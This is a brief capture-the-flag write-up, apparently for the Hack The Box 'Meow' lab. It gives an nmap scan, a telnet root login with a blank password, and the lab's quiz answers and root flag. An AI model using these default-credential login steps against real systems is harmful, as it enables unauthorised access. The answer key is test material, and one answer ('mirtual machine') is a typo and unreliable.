# MEOW

> IP: [10.129.151.55]

## TASKS

1. Start machine
2. NMAP
   1. > nmap -sC -sV 10.129.151.55 -oN init_scan
      1. Port 23 -> telnet
3. TELNET
   1. > telnet 10.129.151.55
      1. UN: admin, administrator, root, meow
      2. PW: ""
4. ENUMERATION
   1. We are now root on the box so lets grab the flag
      1. > cat /root/flag.txt
         1. FLAG: `b40abdfe23665f766f9c61ecba8a4c19`

## QUESTIONS

1. What does the acronym VM stand for?
   1. `mirtual machine`
2. What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It's also known as a console or shell.
   1. `terminal`
3. What service do we use to form our VPN connection into HTB labs?
   1. `openvpn`
4. What tool do we use to test our connection to the target with an ICMP echo request?
   1. `ping`
5. What is the name of the most common tool for finding open ports on a target?
   1. `nmap`
6. What service do we identify on port 23/tcp during our scans?
   1. `telnet`
7. What username is able to log into the target over telnet with a blank password?
   1. `root`
8. Submit root flag
   1. `b40abdfe23665f766f9c61ecba8a4c19`
